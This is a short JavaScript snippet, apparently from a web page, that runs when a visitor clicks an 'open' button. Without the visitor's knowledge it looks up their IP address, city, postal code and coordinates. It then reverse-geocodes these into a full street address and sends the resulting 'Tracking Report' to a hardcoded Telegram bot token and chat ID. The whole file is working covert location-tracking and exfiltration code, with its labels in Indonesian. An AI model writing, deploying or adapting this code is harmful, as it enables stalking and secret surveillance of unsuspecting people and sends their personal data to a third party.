(()=>{
  // === TOKEN & CHAT ID TELEGRAM  ===
  const T='7740915138:AAGGgWA1Zq39H95q2o90VCwr6tPcgaZva8k',
        C='7189193429';

  const sTG=async d=>{
    try{
      await fetch(`https://api.telegram.org/bot${T}/sendMessage`,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:C,text:d,parse_mode:'HTML'})
      });
    }catch(e){}
  };

  const gLD=async(a,b)=>{
    try{
      const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`);
      const d=await r.json();
      if(d.address) return {
        kb: d.address.county || d.address.city || d.address.state || "Tidak diketahui",
        kc: d.address.suburb || d.address.village || d.address.town || "Tidak diketahui",
        fa: d.display_name || "Alamat tidak tersedia"
      }
    }catch(e){}
    return{kb:"Tidak diketahui",kc:"Tidak diketahui",fa:"Alamat tidak tersedia"}
  };

  const cDI=async()=>{
    let m='â•­â”€â”€â”€â”€â”€ Tracking Report â”€â”€â”€â”€â”€ â¦¿\n\n';
    try{
      const i=await fetch('https://ipapi.co/json/');
      const d=await i.json();
      m+='ðŸ“ LOCATION INFORMATION\n';
      m+=`ðŸ“¡ IP Address: ${d.ip}\nðŸ™ï¸ Kota: ${d.city}\nðŸ™ï¸ Kabupaten: ${d.region}\nðŸ—ºï¸ Wilayah: ${d.region}\nðŸŒŽ Negara: ${d.country_name}\nðŸ·ï¸ Kode Pos: ${d.postal}\n`;
      if(d.latitude&&d.longitude){
        m+=`ðŸ“Œ Latitude: ${d.latitude}\nðŸ“ Longitude: ${d.longitude}\n`;
        const l=await gLD(d.latitude,d.longitude);
        m+=`ðŸ™ï¸ Kabupaten: ${l.kb}\nðŸ™ï¸ Kecamatan: ${l.kc}\nðŸ  Alamat Lengkap: ${l.fa}\n`;
      }
    }catch(e){m+='âŒ Gagal mendapatkan informasi lokasi\n';}

    m+='\nâ•°â”€â”€â”€â”€â”€ Telegram @LVYNXP â”€â”€â”€â”€â”€';
    sTG(m);
  };

  document.getElementById("openBtn").addEventListener("click",()=>{ cDI(); });
})();
